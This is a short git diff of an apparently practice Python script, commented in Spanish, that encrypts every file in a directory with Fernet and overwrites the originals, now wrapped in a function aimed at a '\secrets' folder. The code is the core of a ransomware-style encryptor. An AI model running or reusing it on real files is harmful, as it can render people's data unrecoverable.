@@ -1,3 +1,5 @@
+#Programa que cifra los archivos a partir de una ubicación.
+
 from cryptography.fernet import Fernet
 import os
 
@@ -18,9 +20,9 @@ def encrypt(items, key):
         with open(item, 'wb') as file:
             file.write(encrypted_data)
 
-if __name__ == '__main__':
+def cifrar():
 
-    path_to_encrypt = 'C:\\Users\\marci\\Downloads\\practicas\\scriptsP\\secretos'
+    path_to_encrypt = '\secrets'
     items = os.listdir(path_to_encrypt)
     full_path = [path_to_encrypt+'\\'+item for item in items]
 
